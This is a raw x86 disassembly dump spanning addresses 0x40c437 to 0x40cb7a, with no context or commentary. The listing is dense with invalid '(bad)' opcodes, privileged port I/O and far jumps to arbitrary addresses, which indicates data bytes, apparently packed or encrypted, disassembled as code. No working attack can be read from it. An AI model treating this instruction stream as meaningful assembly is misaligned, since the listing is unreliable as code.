  40c437:	jne    0x40c46b
  40c439:	xchg   ecx,eax
  40c43a:	inc    ecx
  40c43b:	jmp    0x40c488
  40c43d:	cli    
  40c43e:	pop    esp
  40c43f:	loopne 0x40c48e
  40c441:	out    0x8e,eax
  40c443:	push   ss
  40c444:	sbb    eax,0x1faecb60
  40c449:	mov    ds:0xe9680f03,al
  40c44e:	xchg   edx,eax
  40c44f:	aaa    
  40c450:	(bad)  
  40c451:	jle    0x40c49d
  40c453:	xor    al,ch
  40c455:	jb     0x40c44c
  40c457:	mov    cl,0xa1
  40c459:	jo     0x40c47a
  40c45b:	pop    ebx
  40c45c:	test   eax,0x3923324e
  40c461:	jno    0x40c446
  40c463:	push   eax
  40c464:	cmp    BYTE PTR [edx+0x450f55d9],ch
  40c46a:	test   BYTE PTR [ebp-0x5b],0xce
  40c46e:	stc    
  40c46f:	fs call 0x274e5af2
  40c475:	pop    esp
  40c476:	std    
  40c477:	cmp    DWORD PTR [edx+0x72],esi
  40c47a:	mov    esi,0x41218bf8
  40c47f:	xchg   esp,eax
  40c480:	mov    eax,ds:0xdb41805b
  40c485:	in     al,0x1e
  40c487:	pop    esi
  40c488:	inc    ecx
  40c489:	out    0xfc,al
  40c48b:	mov    ds,WORD PTR [ebx]
  40c48d:	out    0xe8,eax
  40c48f:	fisub  WORD PTR [edx+0x2a991380]
  40c495:	in     eax,0xa6
  40c497:	shl    BYTE PTR ds:0xcf7299c9,0x21
  40c49e:	mov    eax,0xfc04b70c
  40c4a3:	mov    ebp,0x12cb6888
  40c4a8:	ins    BYTE PTR es:[edi],dx
  40c4a9:	mov    ah,0xae
  40c4ab:	pop    ds
  40c4ac:	sbb    eax,0x555f580
  40c4b1:	(bad)  
  40c4b2:	mov    ecx,0x715e4a04
  40c4b7:	push   es
  40c4b8:	sbb    al,0x59
  40c4ba:	jmp    0x40c451
  40c4bc:	sbb    eax,0xc430a35
  40c4c1:	js     0x40c527
  40c4c3:	arpl   bx,ax
  40c4c5:	outs   dx,DWORD PTR ds:[esi]
  40c4c6:	stc    
  40c4c7:	sbb    BYTE PTR [ebp+0x21],ch
  40c4ca:	mov    esp,0xd74d74e2
  40c4cf:	pop    ecx
  40c4d0:	icebp  
  40c4d1:	in     eax,0x92
  40c4d3:	pop    ebx
  40c4d4:	pop    ebx
  40c4d5:	test   DWORD PTR [ebp-0x18fe3240],eax
  40c4db:	leave  
  40c4dc:	arpl   WORD PTR [eax+0x46],di
  40c4df:	fiadd  WORD PTR [eax]
  40c4e1:	jg     0x40c4aa
  40c4e3:	test   al,0xe8
  40c4e5:	mov    WORD PTR [ebx],es
  40c4e7:	and    cl,0xdc
  40c4ea:	js     0x40c4a6
  40c4ec:	inc    ecx
  40c4ed:	(bad)  
  40c4ef:	ss scas eax,DWORD PTR es:[edi]
  40c4f1:	cli    
  40c4f2:	or     BYTE PTR [ebp-0x3e],bh
  40c4f5:	xchg   DWORD PTR [edi+ecx*2+0x4d9a4af4],ebp
  40c4fc:	sti    
  40c4fd:	sar    ah,1
  40c4ff:	ror    edi,1
  40c501:	imul   ecx,DWORD PTR [esi],0xffffff84
  40c504:	inc    edi
  40c505:	cli    
  40c506:	je     0x40c49a
  40c508:	push   edi
  40c509:	int3   
  40c50a:	imul   eax,DWORD PTR [esi-0x3f],0x51354007
  40c511:	or     eax,esi
  40c513:	lock add DWORD PTR ds:[edi-0x55],edi
  40c518:	hlt    
  40c519:	push   ebp
  40c51a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c51b:	(bad)  
  40c51c:	jl     0x40c52c
  40c51e:	lods   eax,DWORD PTR ds:[esi]
  40c51f:	cmp    esi,DWORD PTR [esi+0x4c]
  40c522:	test   BYTE PTR [ebp-0x3a5cdb1c],0x81
  40c529:	inc    edx
  40c52a:	ror    BYTE PTR [edi],0xba
  40c52d:	sub    DWORD PTR [ebx+0x55],edi
  40c530:	out    dx,eax
  40c531:	xchg   edx,eax
  40c532:	test   eax,0xefcfb131
  40c537:	jl     0x40c562
  40c539:	cmp    DWORD PTR [ebx+0x41cf4060],edx
  40c53f:	sub    edi,DWORD PTR [eax+0x3]
  40c542:	sbb    eax,0x1e029853
  40c547:	(bad)  
  40c548:	sbb    esp,DWORD PTR [esi+0x26]
  40c54b:	jmp    0xb129916d
  40c550:	mov    dl,0x12
  40c552:	xchg   edx,eax
  40c553:	cmp    BYTE PTR [ecx+0x40],dh
  40c556:	shl    ebx,0xdb
  40c559:	jmp    0x4367:0x747e3a19
  40c560:	enter  0x2cb4,0x1a
  40c564:	jge    0x40c5ad
  40c566:	scas   al,BYTE PTR es:[edi]
  40c567:	mov    BYTE PTR [ecx+0x15],cl
  40c56a:	ja     0x40c54a
  40c56c:	xor    esp,DWORD PTR [ebp+0x3de217ca]
  40c572:	leave  
  40c573:	outs   dx,BYTE PTR ds:[esi]
  40c574:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c575:	sub    esp,esp
  40c577:	dec    edi
  40c578:	inc    ecx
  40c579:	ja     0x40c521
  40c57b:	data16 fcom st(4)
  40c57e:	fdiv   DWORD PTR [ecx+0x7f]
  40c581:	in     eax,dx
  40c582:	push   esp
  40c583:	and    BYTE PTR [edi-0x602f7ed5],dh
  40c589:	jo     0x40c53d
  40c58b:	or     DWORD PTR [edi+0x28f383d6],esp
  40c591:	or     DWORD PTR [ecx+0x20a5f709],ecx
  40c597:	out    dx,al
  40c598:	ins    DWORD PTR es:[edi],dx
  40c599:	push   ebx
  40c59a:	stos   BYTE PTR es:[edi],al
  40c59b:	mov    WORD PTR [esi-0x3b9c97d1],cs
  40c5a1:	inc    esi
  40c5a2:	out    0x8b,al
  40c5a4:	fistp  WORD PTR [esi]
  40c5a6:	mov    al,ds:0x5073e323
  40c5ab:	adc    DWORD PTR [eax+0x35f5636],0x3552db6c
  40c5b5:	add    al,0x60
  40c5b7:	(bad)  
  40c5bb:	fisub  DWORD PTR [ebp-0x2e]
  40c5be:	ds stos BYTE PTR es:[edi],al
  40c5c0:	stos   DWORD PTR es:[edi],eax
  40c5c1:	mov    bh,0xd9
  40c5c3:	adc    al,0xc6
  40c5c5:	in     eax,0x96
  40c5c7:	mov    al,al
  40c5c9:	pop    edx
  40c5ca:	sbb    eax,0x61e6094
  40c5cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5d0:	sbb    al,0xfa
  40c5d2:	ins    BYTE PTR es:[edi],dx
  40c5d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5d5:	mov    ebp,0x894ac4e7
  40c5da:	dec    edx
  40c5db:	xchg   esp,eax
  40c5dc:	mov    esp,0x4b0ff353
  40c5e1:	jno    0x40c5c6
  40c5e3:	xor    DWORD PTR [eax-0x55],ebx
  40c5e6:	sub    BYTE PTR [ebp-0x59fd3b4],dl
  40c5ec:	pop    eax
  40c5ed:	add    eax,0x92d45276
  40c5f2:	push   edx
  40c5f3:	jl     0x40c5c6
  40c5f5:	mov    eax,0x448aba5a
  40c5fa:	jl     0x40c602
  40c5fc:	xchg   ebp,eax
  40c5fd:	push   eax
  40c5fe:	jg     0x40c64c
  40c600:	push   ds
  40c601:	mov    edi,0x26d28497
  40c606:	cmp    dh,BYTE PTR [edi+esi*4+0x1]
  40c60a:	fild   WORD PTR [ebx+0x40]
  40c60d:	mov    dh,0x28
  40c60f:	jg     0x40c684
  40c611:	dec    ebx
  40c612:	loop   0x40c669
  40c614:	sub    eax,0x74f1dad6
  40c619:	sub    al,0xb4
  40c61b:	pslld  mm4,QWORD PTR [edi+0x7b]
  40c61f:	(bad)  
  40c620:	xor    DWORD PTR [esi+0x4f],eax
  40c623:	arpl   WORD PTR [ecx],dx
  40c625:	stos   BYTE PTR es:[edi],al
  40c626:	lods   eax,DWORD PTR ds:[esi]
  40c627:	mov    eax,ds:0xf2cbed0d
  40c62c:	mov    edx,ebx
  40c62e:	xor    ah,BYTE PTR [edi+ecx*4+0x7118d16b]
  40c635:	outs   dx,BYTE PTR ds:[esi]
  40c636:	mov    gs,WORD PTR [esi]
  40c638:	hlt    
  40c639:	int3   
  40c63a:	or     eax,0xee6c0ef3
  40c63f:	mov    ch,0xb9
  40c641:	fnsave [eax]
  40c643:	inc    esi
  40c644:	xor    eax,0xe0bb5184
  40c649:	mov    bl,0xc9
  40c64b:	pushf  
  40c64c:	mov    ecx,esp
  40c64e:	hlt    
  40c64f:	lods   al,BYTE PTR ds:[esi]
  40c650:	mov    edi,DWORD PTR [ebp+0x14]
  40c653:	inc    esp
  40c654:	sub    al,ah
  40c656:	push   ecx
  40c657:	pop    ss
  40c658:	jns    0x40c637
  40c65a:	xor    al,0xbe
  40c65c:	sbb    eax,0x8e92965a
  40c661:	in     al,0x34
  40c663:	sbb    al,0x6e
  40c665:	xor    esi,DWORD PTR [edi+0x64]
  40c668:	mov    ds:0xb90315ce,al
  40c66d:	(bad)  
  40c66e:	in     eax,dx
  40c66f:	or     cl,cl
  40c671:	retf   
  40c672:	dec    ax
  40c674:	ins    BYTE PTR es:[edi],dx
  40c675:	xor    dh,cl
  40c677:	dec    eax
  40c678:	aas    
  40c679:	fmul   QWORD PTR [edx+edi*1-0x42ae162]
  40c680:	add    BYTE PTR [eax],bh
  40c682:	mov    bh,0x23
  40c684:	inc    ebp
  40c685:	fmul   QWORD PTR [edi+0x9]
  40c688:	inc    esp
  40c689:	xor    DWORD PTR [ecx-0x68b164c7],edx
  40c68f:	dec    edx
  40c690:	or     BYTE PTR [esi+0x4f],al
  40c693:	or     BYTE PTR [esi-0x16],0xc3
  40c697:	fdivr  QWORD PTR [ebp-0x6c24487a]
  40c69d:	cwde   
  40c69e:	sub    DWORD PTR [ebx+ebp*8-0x3b],0xc5d501ba
  40c6a6:	sub    ah,dl
  40c6a8:	les    ecx,FWORD PTR [edx+eax*2]
  40c6ab:	pop    ds
  40c6ac:	(bad)  
  40c6ad:	xor    BYTE PTR ds:0x307dc639,dh
  40c6b3:	adc    ebx,DWORD PTR [edi]
  40c6b5:	bound  esi,QWORD PTR [edx+0x3a7aa4f3]
  40c6bb:	bound  esp,QWORD PTR [edi]
  40c6bd:	outs   dx,BYTE PTR ds:[esi]
  40c6be:	mov    ds:0xb5fecd19,al
  40c6c3:	fnstsw WORD PTR [ebx+ebp*2-0x7a342c8a]
  40c6ca:	int    0x36
  40c6cc:	or     dh,BYTE PTR [ecx-0x53216065]
  40c6d2:	aam    0xa7
  40c6d4:	stos   BYTE PTR es:[edi],al
  40c6d5:	arpl   WORD PTR [edx+0x204149b1],di
  40c6db:	std    
  40c6dc:	sbb    edx,ecx
  40c6de:	push   eax
  40c6df:	cmc    
  40c6e0:	push   esp
  40c6e1:	dec    ebx
  40c6e2:	inc    ebx
  40c6e3:	dec    ebp
  40c6e4:	sub    al,0x3
  40c6e6:	clc    
  40c6e7:	xor    BYTE PTR [edx+0x3faba594],bh
  40c6ed:	repnz pop eax
  40c6ef:	push   edx
  40c6f0:	and    eax,0x84896439
  40c6f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6f6:	and    al,0x60
  40c6f8:	(bad)  
  40c6f9:	xchg   ebp,eax
  40c6fa:	jo     0x40c70a
  40c6fc:	add    al,0xd5
  40c6fe:	dec    esp
  40c6ff:	fcomp  st(3)
  40c701:	scas   al,BYTE PTR es:[edi]
  40c702:	jle    0x40c749
  40c704:	sbb    BYTE PTR [eax+eiz*2+0x76],0xa
  40c709:	push   cs
  40c70a:	test   DWORD PTR [ebx-0x80],edi
  40c70d:	pop    edx
  40c70e:	psubsb mm7,QWORD PTR [edx-0x5dbda382]
  40c715:	in     eax,dx
  40c716:	retf   
  40c717:	scas   eax,DWORD PTR es:[edi]
  40c718:	fsubrp st(6),st
  40c71a:	call   0x772430a1
  40c71f:	test   eax,0xd6c47b96
  40c724:	(bad)  [edi]
  40c726:	jle    0x40c6e4
  40c728:	mov    bh,0xe
  40c72a:	scas   eax,DWORD PTR es:[edi]
  40c72b:	add    DWORD PTR [edi],esi
  40c72d:	cli    
  40c72e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c72f:	jo     0x40c730
  40c731:	ins    DWORD PTR es:[edi],dx
  40c732:	scas   eax,DWORD PTR es:[edi]
  40c733:	inc    esp
  40c734:	sub    DWORD PTR [ebx],edi
  40c736:	xlat   BYTE PTR ds:[ebx]
  40c737:	in     eax,0x0
  40c739:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40c73b:	rol    DWORD PTR [edi+eax*1],0x28
  40c73f:	xchg   esp,eax
  40c740:	in     eax,dx
  40c741:	push   edi
  40c742:	add    ebp,DWORD PTR [edx+0x49]
  40c745:	popf   
  40c746:	push   edi
  40c747:	fwait
  40c748:	mov    al,ds:0xe4d843a7
  40c74d:	test   al,0xae
  40c74f:	inc    esi
  40c750:	int    0xac
  40c752:	lods   eax,DWORD PTR ds:[esi]
  40c753:	xor    eax,0x1f1e57ed
  40c758:	mov    al,0xe4
  40c75a:	sbb    BYTE PTR [ecx-0x71fc71ba],0x98
  40c761:	shl    BYTE PTR [ecx],cl
  40c763:	mov    al,0x36
  40c765:	jnp    0x40c76e
  40c767:	je     0x40c770
  40c769:	xor    al,0x49
  40c76b:	push   edx
  40c76c:	hlt    
  40c76d:	loopne 0x40c73f
  40c76f:	lock sub BYTE PTR [esi],cl
  40c772:	push   0x33
  40c774:	mov    edi,?
  40c776:	test   al,0xf4
  40c778:	mov    DWORD PTR [esi-0x7350bac0],0x3971b7a8
  40c782:	sub    esp,0x8db5b8fa
  40c788:	retf   0x8509
  40c78b:	mov    cl,0xa6
  40c78d:	push   esi
  40c78e:	push   ebp
  40c78f:	push   eax
  40c790:	dec    ebx
  40c791:	out    0x8d,eax
  40c793:	ja     0x40c78b
  40c795:	sub    cl,BYTE PTR [esi+0x7e20075d]
  40c79b:	das    
  40c79c:	pop    ss
  40c79d:	mov    esp,0x59649380
  40c7a2:	sbb    ah,BYTE PTR [edi+0x241fbd01]
  40c7a8:	es gs push es
  40c7ab:	or     BYTE PTR [eax],bl
  40c7ad:	out    0x15,al
  40c7af:	fs (bad) 
  40c7b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7b2:	adc    al,0x9b
  40c7b4:	aad    0x38
  40c7b6:	cs push ss
  40c7b8:	test   eax,0xf705fd41
  40c7bd:	(bad)  
  40c7be:	ins    BYTE PTR es:[edi],dx
  40c7bf:	mov    eax,DWORD PTR [esi-0x73]
  40c7c2:	je     0x40c77c
  40c7c4:	rol    BYTE PTR [eax],0x4d
  40c7c7:	sub    BYTE PTR [ebx+0x25],ah
  40c7ca:	pop    eax
  40c7cb:	out    0x67,al
  40c7cd:	push   0xfffffffa
  40c7cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7d0:	rol    BYTE PTR [edi-0x60],cl
  40c7d3:	test   bl,ch
  40c7d5:	pusha  
  40c7d6:	jmp    0x40c780
  40c7d8:	mov    bh,0xf5
  40c7da:	sbb    DWORD PTR [ecx+0x46],esp
  40c7dd:	push   ds
  40c7de:	loop   0x40c824
  40c7e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7e1:	ja     0x40c794
  40c7e3:	clc    
  40c7e4:	and    DWORD PTR [ebx],ecx
  40c7e6:	push   cs
  40c7e7:	(bad)  
  40c7e8:	push   ds
  40c7e9:	push   esi
  40c7ea:	pop    edi
  40c7eb:	mov    DWORD PTR [edi+eiz*1-0x2c],0xd2be6fbd
  40c7f3:	in     eax,dx
  40c7f4:	ret    0xaccc
  40c7f7:	push   edi
  40c7f8:	stc    
  40c7f9:	mov    al,BYTE PTR [esi+edx*2+0x6514b1ee]
  40c800:	ret    
  40c801:	mov    al,ds:0x6f9017ff
  40c806:	pop    ss
  40c807:	push   eax
  40c808:	nop
  40c809:	push   ecx
  40c80a:	push   ss
  40c80b:	sub    bh,BYTE PTR ds:0x868a7bd5
  40c811:	retf   
  40c812:	jmp    0x8a00fdda
  40c817:	int3   
  40c818:	loope  0x40c87c
  40c81a:	fwait
  40c81b:	aad    0x93
  40c81d:	xchg   edi,eax
  40c81e:	or     ebx,esi
  40c820:	mov    ch,ah
  40c822:	xor    al,0x93
  40c824:	xor    eax,0xec1ca260
  40c829:	fs test eax,0xf17f3e6f
  40c82f:	(bad)
  40c832:	psrld  mm5,QWORD PTR [edi]
  40c835:	xchg   ecx,eax
  40c836:	data16 fiadd WORD PTR [esi-0x3e]
  40c83a:	and    eax,edx
  40c83c:	xchg   esi,eax
  40c83d:	mov    ecx,0x8dcb1fe9
  40c842:	in     al,dx
  40c843:	jl     0x40c893
  40c845:	jp     0x40c865
  40c847:	cdq    
  40c848:	ins    DWORD PTR es:[edi],dx
  40c849:	aaa    
  40c84a:	dec    ebx
  40c84b:	fcomp  QWORD PTR [eax+0x53]
  40c84e:	push   ebx
  40c84f:	mov    ebp,0x18f7d83e
  40c854:	adc    esp,DWORD PTR ss:[esi]
  40c857:	xor    eax,0x444cba
  40c85c:	mov    ebx,?
  40c85e:	push   ecx
  40c85f:	leave  
  40c860:	imul   ecx,DWORD PTR [esi+0x1d71255c],0xa55e0d51
  40c86a:	gs inc edi
  40c86c:	scas   al,BYTE PTR es:[edi]
  40c86d:	cmp    al,BYTE PTR [ecx+0x7b]
  40c870:	mov    esp,0xea3bc996
  40c875:	push   ebp
  40c876:	mov    esp,0xc985f2e
  40c87b:	int    0xbb
  40c87d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c87e:	pop    edx
  40c87f:	mov    edi,0x71a6dbfd
  40c884:	cmovno ecx,DWORD PTR cs:[eax-0x7a]
  40c889:	fild   DWORD PTR [esi]
  40c88b:	jns    0x40c829
  40c88d:	addr16 and eax,ebp
  40c890:	je     0x40c8c0
  40c892:	cmp    BYTE PTR [ebx],bl
  40c894:	sar    DWORD PTR [edx],0xf7
  40c897:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c898:	dec    esp
  40c899:	rcr    BYTE PTR [ecx-0x9],cl
  40c89c:	fs aas 
  40c89e:	push   edx
  40c89f:	test   BYTE PTR [ebp+0x53],0x85
  40c8a3:	mov    bh,0x70
  40c8a5:	jnp    0x40c926
  40c8a7:	xor    eax,0x3c8fcfe4
  40c8ac:	lea    ebx,[ecx-0x2]
  40c8af:	pop    ecx
  40c8b0:	dec    esp
  40c8b1:	add    esp,DWORD PTR [esi]
  40c8b3:	(bad)  
  40c8b5:	rol    edi,0xd5
  40c8b8:	xchg   edi,eax
  40c8b9:	std    
  40c8ba:	fst    QWORD PTR [esi+esi*4]
  40c8bd:	fwait
  40c8be:	jb     0x40c936
  40c8c0:	inc    ebp
  40c8c1:	retf   
  40c8c2:	sbb    al,0x99
  40c8c4:	push   ds
  40c8c5:	inc    esp
  40c8c6:	xchg   ecx,eax
  40c8c7:	loop   0x40c904
  40c8c9:	test   al,0x7c
  40c8cc:	out    dx,eax
  40c8cd:	xchg   esp,eax
  40c8ce:	outs   dx,DWORD PTR ds:[esi]
  40c8cf:	rol    DWORD PTR [edx+0x3b],1
  40c8d2:	xor    DWORD PTR [esi],esp
  40c8d4:	aad    0x6c
  40c8d6:	pushf  
  40c8d7:	shl    BYTE PTR [edx],0xb3
  40c8da:	and    al,0x3f
  40c8dc:	fadd   QWORD PTR [eax+edx*2+0x4e]
  40c8e0:	mov    ds:0xdd27c6f7,eax
  40c8e5:	mov    ebp,0x60c495f6
  40c8ea:	lock mov ah,0xfb
  40c8ed:	in     al,0x18
  40c8ef:	add    bl,ch
  40c8f1:	push   0xffffffc7
  40c8f3:	push   ebp
  40c8f4:	sbb    DWORD PTR [ebx],esi
  40c8f6:	xor    al,0x85
  40c8f8:	jmp    0x432e6587
  40c8fd:	mov    esi,0xc1747e8b
  40c902:	xor    edi,DWORD PTR [edi]
  40c904:	sub    ebx,DWORD PTR [ecx]
  40c906:	test   DWORD PTR [ecx-0xf],esi
  40c909:	cli    
  40c90a:	adc    dh,ah
  40c90c:	icebp  
  40c90d:	jmp    0x4671:0x71ee6f9c
  40c914:	icebp  
  40c915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c916:	shr    BYTE PTR [ecx+ecx*2+0x1a4b5f50],0x19
  40c91e:	xchg   edi,eax
  40c91f:	adc    BYTE PTR [ecx],cl
  40c921:	pop    ebx
  40c922:	jp     0x40c95e
  40c924:	lds    ebx,FWORD PTR [eax+0x1cd7db5e]
  40c92a:	push   es
  40c92b:	pop    edx
  40c92c:	int3   
  40c92d:	mov    al,0xdc
  40c92f:	jmp    0x40c939
  40c931:	std    
  40c932:	ror    DWORD PTR [edi],1
  40c934:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40c936:	and    al,0x87
  40c938:	mov    BYTE PTR [ebp+0x2f],dh
  40c93b:	clc    
  40c93c:	rcl    ecx,1
  40c93e:	xor    DWORD PTR [eax-0x72],ebx
  40c941:	fldenv [esi]
  40c943:	xor    DWORD PTR ds:0x2e9361b0,esp
  40c949:	jb     0x40c967
  40c94b:	jg     0x40c904
  40c94d:	imul   ebp,DWORD PTR [edi-0xb6e8d6b],0xffffffa4
  40c954:	lods   eax,DWORD PTR ds:[esi]
  40c955:	sti    
  40c956:	fcmove st,st(2)
  40c958:	repnz loop 0x40c9a7
  40c95b:	inc    edi
  40c95c:	xor    al,BYTE PTR [edi+0x5e88331b]
  40c962:	jae    0x40c963
  40c964:	mov    edi,0x224d5ef2
  40c969:	bound  esp,QWORD PTR [ecx-0x5a]
  40c96c:	pop    eax
  40c96d:	or     BYTE PTR [eax+0x1685948f],0x33
  40c974:	in     al,0xcd
  40c976:	test   DWORD PTR [esi],0xab44af3d
  40c97c:	pushf  
  40c97d:	imul   eax,DWORD PTR [edi],0x4d301f96
  40c983:	stos   DWORD PTR es:[edi],eax
  40c984:	adc    BYTE PTR [ecx],ah
  40c986:	frstor [esi+0x359632c8]
  40c98c:	ficom  WORD PTR [ecx+0x50]
  40c98f:	cmp    ebp,ecx
  40c991:	cmp    BYTE PTR [eax+0x11],0xf5
  40c995:	cmp    al,0x57
  40c997:	or     cl,dl
  40c999:	lods   eax,DWORD PTR ds:[esi]
  40c99a:	(bad)  
  40c99b:	cld    
  40c99c:	pop    esp
  40c99d:	call   0x92b:0x9c138d03
  40c9a4:	ds dec esi
  40c9a6:	icebp  
  40c9a7:	inc    esp
  40c9a8:	sub    esi,DWORD PTR [ebx]
  40c9aa:	sub    eax,0x56cc1f4
  40c9af:	jb     0x40c981
  40c9b1:	inc    ebx
  40c9b2:	and    al,0xaa
  40c9b4:	in     eax,0xc8
  40c9b6:	mov    dl,ch
  40c9b8:	cdq    
  40c9b9:	push   cs
  40c9ba:	push   edi
  40c9bb:	add    esi,edx
  40c9bd:	or     al,0x47
  40c9bf:	mov    al,ds:0xf83ced72
  40c9c4:	pop    ebp
  40c9c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9c6:	cwde   
  40c9c7:	xchg   esi,eax
  40c9c8:	in     eax,0x2f
  40c9ca:	mov    dh,0x1c
  40c9cc:	cmp    eax,0x83ed2404
  40c9d1:	jae    0x40c9d3
  40c9d3:	xchg   ebp,eax
  40c9d4:	mov    ebp,0xea673378
  40c9d9:	jns    0x40c988
  40c9db:	les    ebx,FWORD PTR [eax]
  40c9dd:	cld    
  40c9de:	mov    bh,0x4
  40c9e0:	cs xchg ebp,eax
  40c9e2:	pop    esi
  40c9e3:	xchg   ebx,eax
  40c9e4:	add    al,0x3c
  40c9e6:	ret    
  40c9e7:	aas    
  40c9e8:	mov    ebp,0x961eada2
  40c9ed:	in     al,dx
  40c9ee:	jnp    0x40ca02
  40c9f0:	test   BYTE PTR [eax],bl
  40c9f2:	xor    ah,bh
  40c9f4:	sub    ah,BYTE PTR [edi-0x6]
  40c9f7:	jmp    0x40ca30
  40c9f9:	jecxz  0x40c9f6
  40c9fb:	and    al,0xa6
  40c9fd:	sub    eax,0xb90f50d8
  40ca02:	daa    
  40ca03:	sbb    esi,DWORD PTR [ebp-0x38]
  40ca06:	push   ebp
  40ca07:	dec    eax
  40ca08:	in     al,dx
  40ca09:	sti    
  40ca0a:	repz jmp 0xeff3fd26
  40ca10:	sub    esp,DWORD PTR [esp+edx*1+0x9af6c24]
  40ca17:	loope  0x40ca3e
  40ca19:	cli    
  40ca1a:	mov    eax,ds:0x4fa20f63
  40ca1f:	mov    esi,DWORD PTR [edx]
  40ca21:	xchg   BYTE PTR [ebx-0x42da02ef],dh
  40ca27:	int3   
  40ca28:	xor    al,0x2
  40ca2a:	loopne 0x40ca91
  40ca2c:	outs   dx,BYTE PTR ds:[esi]
  40ca2d:	push   es
  40ca2e:	lahf   
  40ca2f:	scas   eax,DWORD PTR es:[edi]
  40ca30:	adc    BYTE PTR [ebx+edi*4-0x42],cl
  40ca34:	popf   
  40ca35:	mov    al,ds:0xdd45cd94
  40ca3a:	mov    ds:0x5b07f718,eax
  40ca3f:	imul   DWORD PTR [esi+0xf]
  40ca42:	and    DWORD PTR [ecx+0x1c954abb],esi
  40ca48:	lods   eax,DWORD PTR ds:[esi]
  40ca49:	push   eax
  40ca4a:	xlat   BYTE PTR ds:[ebx]
  40ca4b:	dec    esp
  40ca4c:	dec    esp
  40ca4d:	adc    eax,0x6517ffe7
  40ca52:	sub    al,ah
  40ca54:	push   cs
  40ca55:	hlt    
  40ca56:	call   0x3c93:0x8693038d
  40ca5d:	or     al,0x91
  40ca5f:	adc    esi,DWORD PTR [eax+0x3f527dec]
  40ca65:	cmp    BYTE PTR [edx+0x11],0xc6
  40ca69:	ja     0x40cad2
  40ca6b:	mov    eax,ds:0x149e8411
  40ca70:	gs mov edx,0x5789a4e5
  40ca76:	and    al,0x46
  40ca78:	ins    BYTE PTR es:[edi],dx
  40ca79:	or     bh,BYTE PTR ds:0x9f9ae9cb
  40ca7f:	sbb    ecx,DWORD PTR [edi]
  40ca81:	rcl    ebx,0x42
  40ca84:	rcl    BYTE PTR [ecx*4-0x15be1d1c],cl
  40ca8b:	enter  0xadbc,0x4a
  40ca8f:	pop    eax
  40ca90:	push   0x98195b19
  40ca95:	(bad)  
  40ca96:	lock imul edi,DWORD PTR es:[ecx-0x5b3393fa],0x36
  40ca9f:	pop    ds
  40caa0:	mov    bl,0xda
  40caa2:	add    eax,0x99f5217b
  40caa7:	pop    eax
  40caa8:	dec    edi
  40caa9:	fimul  DWORD PTR [eax+0x3c]
  40caac:	add    al,0x53
  40caae:	dec    ecx
  40caaf:	xor    eax,0x7b00fdfb
  40cab4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cab5:	push   esi
  40cab6:	cmp    eax,0x3954ed37
  40cabb:	sar    eax,cl
  40cabd:	dec    esi
  40cabe:	sub    ebp,DWORD PTR [ecx]
  40cac0:	lods   al,BYTE PTR ds:[esi]
  40cac1:	and    al,0x2a
  40cac3:	jne    0x40cb0e
  40cac5:	shl    dh,1
  40cac7:	(bad)  [eax-0x525c0a79]
  40cacd:	push   ebp
  40cace:	jb     0x40cb1b
  40cad0:	cmc    
  40cad1:	ret    0xd84b
  40cad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cad5:	retf   0xc65c
  40cad8:	jnp    0x40cb40
  40cada:	enter  0x77e1,0xd8
  40cade:	pop    es
  40cadf:	dec    ebp
  40cae0:	mov    ecx,0xe8549b5e
  40cae5:	int    0xf9
  40cae7:	mov    ah,BYTE PTR [eax-0x78e838e2]
  40caed:	outs   dx,BYTE PTR ds:[esi]
  40caee:	ror    DWORD PTR [eax+0x4f09dbc8],1
  40caf4:	sub    DWORD PTR [ecx-0x955d60c],esp
  40cafa:	inc    esi
  40cafb:	fisubr DWORD PTR [edx-0x40]
  40cafe:	push   ebx
  40caff:	mov    dh,0x78
  40cb01:	jbe    0x40cb19
  40cb03:	jmp    0x9c54659
  40cb08:	xlat   BYTE PTR ds:[ebx]
  40cb09:	iret   
  40cb0a:	push   eax
  40cb0b:	icebp  
  40cb0c:	ss cmp eax,0xc9967c0a
  40cb12:	dec    edi
  40cb13:	sbb    dh,bl
  40cb15:	loope  0x40caa4
  40cb17:	dec    ebp
  40cb18:	das    
  40cb19:	jmp    0xe396:0xd2eaa601
  40cb20:	arpl   WORD PTR [edi-0xe],dx
  40cb23:	jb     0x40cb20
  40cb25:	xchg   edi,eax
  40cb26:	ds sub bl,ah
  40cb29:	mov    ecx,0xe4374b33
  40cb2e:	xchg   esp,eax
  40cb2f:	cmp    bl,dh
  40cb31:	adc    BYTE PTR [ebx],al
  40cb33:	jg     0x40cb61
  40cb35:	stc    
  40cb36:	pop    ecx
  40cb37:	aaa    
  40cb38:	cdq    
  40cb39:	push   ebp
  40cb3a:	inc    ebx
  40cb3b:	lea    edi,[eax+0x38fc057]
  40cb41:	mov    ah,0x47
  40cb43:	rol    ah,cl
  40cb45:	xchg   edi,eax
  40cb46:	or     al,0xd0
  40cb48:	(bad)  
  40cb49:	pushf  
  40cb4a:	mov    esp,0xa9e52ef6
  40cb4f:	lea    edx,[eax-0x4d76d2e3]
  40cb55:	adc    eax,0x41229e7e
  40cb5a:	sub    al,0x5b
  40cb5c:	jnp    0x40cb53
  40cb5e:	xchg   edx,eax
  40cb5f:	cli    
  40cb60:	imul   ebp,DWORD PTR [edi+eiz*8-0x3dc9e3c7],0xffffff90
  40cb68:	push   0x26
  40cb6a:	call   0x9bccabca
  40cb6f:	and    eax,0x413b5e6d
  40cb74:	ret    
  40cb75:	inc    ecx
  40cb76:	aad    0x31
  40cb78:	fcomip st,st(4)
  40cb7a:	or     al,0xfc
